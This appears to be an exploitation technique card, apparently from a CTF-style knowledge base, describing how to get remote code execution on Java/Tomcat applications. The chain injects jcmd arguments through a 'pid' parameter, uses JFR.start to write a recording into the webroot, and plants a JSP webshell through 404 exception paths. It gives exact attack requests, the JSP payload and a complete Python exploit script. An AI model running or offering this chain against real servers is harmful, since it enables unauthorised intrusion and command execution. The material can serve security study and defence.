---
name: jcmd_jfr_file_write_jsp_rce
vuln_type: rce
sub_technique: jcmd_file_write
category: exploitation
safety_level: safe
---

# Jcmd Argument Injection Via Pid Parameter → Jfr File Write To Webroot → Jsp Webshell Rce

## When to Apply

A Java web application (Tomcat/Spring) exposes diagnostic endpoints that pass user-controlled input (typically a `pid` parameter) to `Runtime.getRuntime().exec("jcmd " + pid + " <subcommand>")`. An input validator blocks bash special characters (;|&$`\!(){}[]<>*?~^'"]) but does NOT block spaces, dots, slashes, dashes, plus signs, or equals signs. Since `Runtime.exec(String)` splits by whitespace (not via a shell), the attacker can inject additional jcmd arguments by including spaces in the pid parameter. JFR (Java Flight Recorder) `JFR.start` can write recording files to arbitrary paths. The webroot's views directory is writable (e.g., chmod 1777). JFR records exception events that contain attacker-controlled data (e.g., URL paths from 404 errors), and Tomcat's JSP compiler processes `<%...%>` tags even within binary JFR data.

## Prerequisites

- Java servlet passes user input to jcmd via Runtime.exec(String) (whitespace-split, no shell)
- Input validation blocks bash specials but allows spaces, dots, slashes, +, -, =
- JDK with JFR support (JDK 11+, typically JDK 17+)
- Writable directory under webroot (e.g., WEB-INF/views/ with chmod 1777)
- Tomcat JSP servlet configured to serve .jsp files from that directory
- jdk.JavaExceptionThrow event enabled in JFR → records exception messages containing URL paths

## Steps

1. Find the JVM PID via `/api/processes` (jcmd list)
2. Start JFR recording with file output to webroot:
   `GET /api/status?pid=1 JFR.start name=pwn settings=none +jdk.JavaExceptionThrow#enabled=true duration=10s filename=/usr/local/tomcat/webapps/ROOT/WEB-INF/views/shell.jsp`
3. Inject JSP code via HTTP requests that cause 404 exceptions:
   `GET /<%=new String(Runtime.getRuntime().exec("/readflag").getInputStream().readAllBytes())%>.x`
   - Tomcat generates a jdk.JavaExceptionThrow event with the URL path as the exception message
   - JFR records this exception text into the .jfr file
4. Wait for JFR duration to complete (file written to disk)
5. Access the JSP: `GET /shell.jsp`
   - Tomcat's JSP compiler finds `<%=...%>` tags in the binary JFR data
   - Executes the embedded Java code → RCE achieved

## Code Template

```
import requests, socket, time, urllib.parse\nT = 'http://TARGET'\nJSP = '<%=new String(Runtime.getRuntime().exec("/readflag").getInputStream().readAllBytes())%>'\npid = '1 JFR.start name=pwn settings=none +jdk.JavaExceptionThrow#enabled=true duration=10s filename=/usr/local/tomcat/webapps/ROOT/WEB-INF/views/shell.jsp'\nrequests.get(f'{T}/api/status', params={'pid': pid})\n# Inject JSP via URL path that triggers JavaExceptionThrow\npath = f'/{urllib.parse.quote(JSP, safe="/")}.x'\nfor _ in range(10):\n    s = socket.socket(); s.connect((HOST, 80))\n    s.sendall(f'GET {path} HTTP/1.1\\r\\nHost: {HOST}\\r\\n\\r\\n'.encode())\n    s.recv(4096); s.close()\ntime.sleep(13)\nprint(requests.get(f'{T}/shell.jsp').text)
```

## Examples

### Example 1

- **jcmd_endpoint**: /api/status, /api/heap, /api/threads — all use jcmd + pid param
- **validator_bypass**: InputValidator blocks ;|&$`\!(){}[]<>*?~^'" but allows spaces/dots/slashes/+/-/=
- **jfr_command**: JFR.start name=pwn settings=none +jdk.JavaExceptionThrow#enabled=true duration=Ns filename=PATH
- **exception_injection**: URL-encoded JSP tags in GET path → 404 → JavaExceptionThrow event recorded in JFR
- **jsp_in_binary**: Tomcat JSP compiler finds <%...%> tags even in binary .jfr data
- **writable_dir**: /usr/local/tomcat/webapps/ROOT/WEB-INF/views/ (chmod 1777)

This technique chains three primitives: (1) jcmd argument injection via whitespace in the pid parameter — Runtime.exec(String) splits by whitespace without invoking a shell, bypassing bash special char filters; (2) JFR file write — JFR.start with a custom filename writes recording data to any writable path; (3) JFR exception recording — enabling jdk.JavaExceptionThrow captures exception messages that include attacker-controlled URL paths, embedding JSP code in the recording file. Tomcat's JSP compiler is tolerant of binary data surrounding JSP tags, so it finds and executes the embedded <%=...%> code from the .jfr binary.
